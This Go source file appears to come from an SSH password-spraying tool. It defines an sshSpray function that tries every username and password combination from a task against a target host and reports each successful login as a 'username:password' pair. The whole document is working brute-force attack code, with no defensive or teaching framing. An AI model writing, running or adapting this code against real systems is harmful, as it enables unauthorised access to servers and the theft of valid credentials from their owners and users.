package main

import (
	"fmt"
	"github.com/GoSpray/gossh"
	"sync"
)



func sshSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task) {
	defer wg.Done()
	for _,username := range taskToRun.usernames {
		for _,password := range taskToRun.passwords {
			sshClient, err := gossh.DialWithPasswd(stringifyTarget(taskToRun.target), username, password)
			if err != nil {
				fmt.Print("-")
			} else {
				fmt.Print("+")
				channelToCommunicate <- username+":"+password
				sshClient.Close()//
			}


		}
	}


}